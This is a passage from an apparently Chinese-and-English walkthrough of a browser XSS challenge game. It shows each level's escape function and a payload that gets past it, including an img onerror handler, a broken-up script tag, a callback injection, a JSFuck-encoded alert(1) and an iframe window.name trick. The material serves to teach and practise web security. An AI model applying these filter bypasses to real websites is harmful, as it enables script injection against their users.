\ ", { name : s } );} OMG, so many chracters are escaped. But don’t worry, the innerHTML is a javascript string. Just use javascript encode, alert: payload: 123&lt; <&gt; ><img src=a onerror=alert(1)> 输出回显 12345&lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt; &lt;script&gt; var v = document.getElementById('name'); v.innerHTML = '&lt;a href=#&gt;<img src=a onerror=alert(1)>&lt;/a&gt;'; &lt;/script&gt; 10.JSON 212345function escape(s) { s = JSON.stringify(s).replace(/&lt;/script/gi, ''); return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';} payload: 1&lt;/scr&lt;/scriptipt&gt;&lt;script&gt;alert(1)&lt;/scr&lt;/scriptipt&gt; 11.Callback 2123456789function escape(s) { // Pass inn "callback#userdata" var thing = s.split(/#/); if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback'; var obj = {'userdata': thing[1] }; var json = JSON.stringify(obj).replace(///g, '\/'); return "&lt;script&gt;" + thing[0] + "(" + json +")&lt;/script&gt;";} payload: 跟第七题类似，但是这里过滤了反斜线，我们可以换一种过滤方式 1'#';alert(1);&lt;!-- 12.Skandia 212345function escape(s) { if (/[&lt;&gt;]/.test(s)) return '-'; return '&lt;script&gt;console.log("' + s.toUpperCase() + '")&lt;/script&gt;';} payload: 这里主要就是过滤了尖括号 123&quot;);alert(1);//输出&lt;script&gt;console.log(&quot;&quot;);ALERT(1);//&quot;)&lt;/script&gt; 我们将 alert(1) 进行 JSFuck 编码 123alert(1)编码之后为:[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 然后替换最初的 alert(1) 即可 13.iframe123456789101112131415161718function escape(s) { var tag = document.createElement('iframe'); // For this one, you get to run any code you want, but in a "sandboxed" iframe. // // https://4i.am/?...raw=... just outputs whatever you pass in. // // Alerting from 4i.am won't count. s = '&lt;script&gt;' + s + '&lt;/script&gt;'; tag.src = 'https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=' + encodeURIComponent(s); window.WINNING = function() { youWon = true; }; tag.setAttribute('onload', 'youWon &amp;&amp; alert(1)'); return tag.outerHTML;}&lt;script&gt;name="youWon"&lt;/script&gt; frames have a interesting feature: setting the name attribute on an iframe sets the name property of the iframe’s global window object to the value of that string. Now, the interesting part is that it can be done the other way around, so an iframe can define its own window.name and the new name will be injected in the parent’s global window object if it does not exist already (it cannot overwrite it).So if we fool the framed site to declare its window.name as “youWon”, a youWon variable will be setted in the parent global window object and so the “alert(1)” will be popped payload: 这里的目的是要让 youWon 变量不为空或者不是未定义，这样我们就可以执行onload=&quot;youWon &amp;&amp; alert(1)&quot; 后面的 alert(1) 14.TI(S)M123456789101112131415161718function escape(s) { function json(s) { return JSON.stringify(s).replace(///g, '\/'); } function html(s) { return s.replace(/[&lt;&gt;"&amp;]/g, function(s) { return '&amp;#' + s.charCodeAt(0) + ';'; }); } return ( '&lt;script&gt;' + 'var url = ' + json(s) + '; // We'll use this later ' + '&lt;/script&gt;

